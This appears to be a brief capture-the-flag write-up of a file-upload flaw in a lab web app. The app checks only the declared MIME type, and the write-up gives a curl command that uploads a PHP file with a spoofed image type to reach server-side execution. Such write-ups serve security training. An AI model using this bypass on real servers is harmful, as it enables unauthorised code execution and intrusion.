On: ```/?page=upload```

### Flaw
The file input only accepts Mime Type ```image/jpeg``` but doesn't check the actual type of the file on the backend. It is therefore possible to upload a PHP file that would be executed and lead to a security breach.

### Flag
To tamper the file type: ```curl -F "uploaded=@hello.php;type=image/jpg" --form "MAX_FILE_SIZE=10000" --form "Upload=Upload" "http://10.11.200.135/?page=upload"```
